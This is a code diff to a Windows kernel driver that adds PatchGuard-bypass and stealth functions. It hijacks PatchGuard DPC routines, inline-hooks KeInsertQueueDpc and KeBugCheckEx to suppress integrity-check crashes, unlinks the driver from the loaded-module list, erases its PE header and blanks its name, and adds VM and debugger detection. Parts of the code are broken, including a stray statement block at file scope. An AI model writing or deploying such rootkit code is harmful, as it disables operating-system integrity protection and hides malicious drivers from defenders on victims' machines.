@@ -22,6 +22,14 @@ typedef struct _KAIROS_PATCH_ENTRY {
     BOOLEAN Active;
 } KAIROS_PATCH_ENTRY, *PKAIROS_PATCH_ENTRY;
 
+typedef struct _PG_BEHAVIOR_PROFILE {
+    LARGE_INTEGER Timestamp;
+    PVOID TriggeredFrom;
+    PVOID DeferredRoutine;
+    ULONG StackHash;
+    BOOLEAN Suppressed;
+} PG_BEHAVIOR_PROFILE;
+
 #define MAX_PATCHES 8
 KAIROS_PATCH_ENTRY g_PatchList[MAX_PATCHES] = { 0 };
 PG_CONTEXT_ENTRY g_PgContextArray[MAX_PG_CONTEXTS];
@@ -158,7 +166,6 @@ VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
     DebugLog("Driver unloading...\n");
 }
 
-// --- DriverEntry ---
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
     UNREFERENCED_PARAMETER(RegistryPath);
     NTSTATUS status;
@@ -189,4 +196,249 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
     g_PgMonitorThreadHandle = threadHandle;
     DebugLog("Driver loaded and monitoring PatchGuard contexts.\n");
     return STATUS_SUCCESS;
+}
+
+#define KERNEL_SCAN_SIZE 0x2000000  // 32MB
+#define PG_DPC_TAG 0x4450434B // 'KCPD' as marker
+
+typedef struct _DETECTED_PG_DPC {
+    PKDPC DpcAddress;
+    PVOID DeferredRoutine;
+} DETECTED_PG_DPC, *PDETECTED_PG_DPC;
+
+#define MAX_PG_DPCS 8
+DETECTED_PG_DPC g_PgDpcs[MAX_PG_DPCS];
+ULONG g_NumDetectedDpcs = 0;
+
+VOID ScanForPatchGuardDpcs() {
+    PVOID base = GetKernelBase();
+    ULONG size = GetKernelSize();
+
+    for (ULONG offset = 0; offset < size - sizeof(KDPC); offset += 8) {
+        PKDPC candidate = (PKDPC)((PUCHAR)base + offset);
+        
+        if (MmIsAddressValid(candidate) &&
+            candidate->Type == 0x13 &&  // DPC type
+            MmIsAddressValid(candidate->DeferredRoutine)) {
+
+            const CHAR* routineName = GetSymbolNameFromAddress(candidate->DeferredRoutine); // your symbol resolver
+            if (routineName && strstr(routineName, "PatchGuard")) {
+                if (g_NumDetectedDpcs < MAX_PG_DPCS) {
+                    g_PgDpcs[g_NumDetectedDpcs].DpcAddress = candidate;
+                    g_PgDpcs[g_NumDetectedDpcs].DeferredRoutine = candidate->DeferredRoutine;
+                    g_NumDetectedDpcs++;
+                    DebugLog("Detected potential PatchGuard DPC: %p (Routine: %p)\n", candidate, candidate->DeferredRoutine);
+                }
+            }
+        }
+    }
+}
+
+VOID NullifyPatchGuardDpcs() {
+    for (ULONG i = 0; i < g_NumDetectedDpcs; i++) {
+        PKDPC dpc = g_PgDpcs[i].DpcAddress;
+        dpc->DeferredRoutine = &FakeDpcRoutine;
+        DebugLog("Hijacked PG DPC at %p -> %p\n", dpc, &FakeDpcRoutine);
+    }
+}
+
+VOID FakeDpcRoutine(IN struct _KDPC *Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2) {
+    UNREFERENCED_PARAMETER(Dpc);
+    UNREFERENCED_PARAMETER(DeferredContext);
+    UNREFERENCED_PARAMETER(SystemArgument1);
+    UNREFERENCED_PARAMETER(SystemArgument2);
+    DebugLog("FakeDpcRoutine called — PG defanged.\n");
+}
+
+PVOID OriginalKeInsertQueueDpc = NULL;
+UCHAR KeInsertQueueDpcOriginal[16] = { 0 };
+UCHAR KeInsertQueueDpcHook[] = {
+    0x48, 0xB8,                   // mov rax, <address>
+    /* 8 bytes of address */
+    0xFF, 0xE0                    // jmp rax
+};
+
+VOID HookKeInsertQueueDpc() {
+    UNICODE_STRING routineName;
+    RtlInitUnicodeString(&routineName, L"KeInsertQueueDpc");
+    PVOID target = MmGetSystemRoutineAddress(&routineName);
+
+    if (!target) return;
+
+    OriginalKeInsertQueueDpc = target;
+    RtlCopyMemory(KeInsertQueueDpcOriginal, target, sizeof(KeInsertQueueDpcOriginal));
+
+    *(PVOID*)&KeInsertQueueDpcHook[2] = &HookedKeInsertQueueDpc;
+
+    // Enable writing to kernel memory
+    PMDL mdl = IoAllocateMdl(target, sizeof(KeInsertQueueDpcHook), FALSE, FALSE, NULL);
+    MmBuildMdlForNonPagedPool(mdl);
+    PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
+
+    RtlCopyMemory(mapped, KeInsertQueueDpcHook, sizeof(KeInsertQueueDpcHook));
+    MmUnmapLockedPages(mapped, mdl);
+    IoFreeMdl(mdl);
+
+    DebugLog("KeInsertQueueDpc hooked.\n");
+}
+
+BOOLEAN HookedKeInsertQueueDpc(PKDPC Dpc, PVOID Arg1, PVOID Arg2, PVOID Arg3) {
+    if (Dpc && MmIsAddressValid(Dpc->DeferredRoutine)) {
+        const CHAR* name = GetSymbolNameFromAddress(Dpc->DeferredRoutine);
+        if (name && strstr(name, "PatchGuard")) {
+            DebugLog("Blocked PG DPC queueing: %p\n", Dpc->DeferredRoutine);
+            return FALSE;  // Cancel PG execution
+        }
+    }
+
+    // Call the original function
+    return ((BOOLEAN(*)(PKDPC, PVOID, PVOID, PVOID))OriginalKeInsertQueueDpc)(Dpc, Arg1, Arg2, Arg3);
+}
+
+VOID UnhookKeInsertQueueDpc() {
+    if (OriginalKeInsertQueueDpc) {
+        PMDL mdl = IoAllocateMdl(OriginalKeInsertQueueDpc, sizeof(KeInsertQueueDpcOriginal), FALSE, FALSE, NULL);
+        MmBuildMdlForNonPagedPool(mdl);
+        PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
+
+        RtlCopyMemory(mapped, KeInsertQueueDpcOriginal, sizeof(KeInsertQueueDpcOriginal));
+        MmUnmapLockedPages(mapped, mdl);
+        IoFreeMdl(mdl);
+
+        DebugLog("KeInsertQueueDpc unhooked.\n");
+    }
+}
+
+PVOID OriginalKeBugCheckEx = NULL;
+UCHAR KeBugCheckExOriginal[16] = { 0 };
+UCHAR KeBugCheckExHook[] = {
+    0x48, 0xB8,                   // mov rax, <hook_address>
+    /* 8 bytes for address */
+    0xFF, 0xE0                    // jmp rax
+};
+
+VOID HookKeBugCheckEx() {
+    UNICODE_STRING funcName;
+    RtlInitUnicodeString(&funcName, L"KeBugCheckEx");
+    PVOID target = MmGetSystemRoutineAddress(&funcName);
+
+    if (!target) return;
+
+    OriginalKeBugCheckEx = target;
+    RtlCopyMemory(KeBugCheckExOriginal, target, sizeof(KeBugCheckExOriginal));
+    *(PVOID*)&KeBugCheckExHook[2] = &HookedKeBugCheckEx;
+
+    // Patch kernel memory safely
+    PMDL mdl = IoAllocateMdl(target, sizeof(KeBugCheckExHook), FALSE, FALSE, NULL);
+    MmBuildMdlForNonPagedPool(mdl);
+    PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
+
+    RtlCopyMemory(mapped, KeBugCheckExHook, sizeof(KeBugCheckExHook));
+    MmUnmapLockedPages(mapped, mdl);
+    IoFreeMdl(mdl);
+
+    DebugLog("KeBugCheckEx hooked.\n");
+}
+
+VOID HookedKeBugCheckEx(ULONG BugCheckCode, ULONG Param1, ULONG Param2, ULONG Param3, ULONG Param4) {
+    // PatchGuard uses 0x109 (CRITICAL_STRUCTURE_CORRUPTION)
+    if (BugCheckCode == 0x109 || BugCheckCode == 0x1A) {
+        DebugLog("!!! PatchGuard tried to crash the system: 0x%X !!!\n", BugCheckCode);
+        return;
+
+        // Call original but log first
+        // ((VOID(*)(ULONG,ULONG,ULONG,ULONG,ULONG))OriginalKeBugCheckEx)(BugCheckCode, Param1, Param2, Param3, Param4);
+    } else {
+        // Non-PG crashes should still happen
+        ((VOID(*)(ULONG,ULONG,ULONG,ULONG,ULONG))OriginalKeBugCheckEx)(BugCheckCode, Param1, Param2, Param3, Param4);
+    }
+}
+
+VOID UnhookKeBugCheckEx() {
+    if (OriginalKeBugCheckEx) {
+        PMDL mdl = IoAllocateMdl(OriginalKeBugCheckEx, sizeof(KeBugCheckExOriginal), FALSE, FALSE, NULL);
+        MmBuildMdlForNonPagedPool(mdl);
+        PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
+
+        RtlCopyMemory(mapped, KeBugCheckExOriginal, sizeof(KeBugCheckExOriginal));
+        MmUnmapLockedPages(mapped, mdl);
+        IoFreeMdl(mdl);
+        DebugLog("KeBugCheckEx unhooked.\n");
+    }
+}VOID HideDriverFromPsLoadedModuleList(PDRIVER_OBJECT DriverObject) {
+    PLIST_ENTRY currentEntry = (PLIST_ENTRY)DriverObject->DriverSection;
+
+    if (!currentEntry) return;
+
+    PLIST_ENTRY prev = currentEntry->Blink;
+    PLIST_ENTRY next = currentEntry->Flink;
+
+    if (prev && next) {
+        prev->Flink = next;
+        next->Blink = prev;
+        currentEntry->Flink = currentEntry->Blink = NULL;
+        DebugLog("Driver unlinked from PsLoadedModuleList.\n");
+    }
+}
+
+VOID ErasePEHeader(PVOID ImageBase) {
+    if (!ImageBase) return;
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return;
+
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((PUCHAR)ImageBase + dosHeader->e_lfanew);
+    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return;
+
+    SIZE_T headerSize = ntHeader->OptionalHeader.SizeOfHeaders;
+    RtlFillMemory(ImageBase, headerSize, 0);
+    DebugLog("PE header erased at %p.\n", ImageBase);
+}
+
+BOOLEAN IsRunningInVMware() {
+    int vmMagic;
+    __try {
+        __asm {
+            mov eax, 'VMXh'
+            mov ecx, 0x0A
+            mov dx, 'VX'
+            in eax, dx
+            mov vmMagic, ebx
+        }
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        return FALSE;
+    }
+    return (vmMagic == 'VMXh');
+}
+
+BOOLEAN IsHyperVPresent() {
+    int cpuInfo[4] = { 0 };
+    __cpuid(cpuInfo, 1);
+    return (cpuInfo[2] >> 31) & 1;
+}
+
+BOOLEAN IsDebuggerPresent() {
+    return KdDebuggerEnabled || KdDebuggerNotPresent == 0;
+}
+
+VOID CloakDriverName(PDRIVER_OBJECT DriverObject) {
+    RtlFillMemory(DriverObject->DriverName.Buffer,
+                  DriverObject->DriverName.Length, 0x00);
+    DriverObject->DriverName.Length = 0;
+    DebugLog("Driver name cloaked.\n");
+}
+
+VOID WalkStackTrace(VOID) {
+    PVOID stack[32] = { 0 };
+    USHORT captured = RtlCaptureStackBackTrace(0, 32, stack, NULL);
+
+    DebugLog("Captured %u stack frames:\n", captured);
+    for (USHORT i = 0; i < captured; i++) {
+        DebugLog("  [%u] %p\n", i, stack[i]);
+    }
+}
+
+if (Dpc && Dpc->DeferredRoutine) {
+    DebugLog("New DPC queued: %p\n", Dpc->DeferredRoutine);
+    WalkStackTrace();  // Identify who queued the DPC
 }
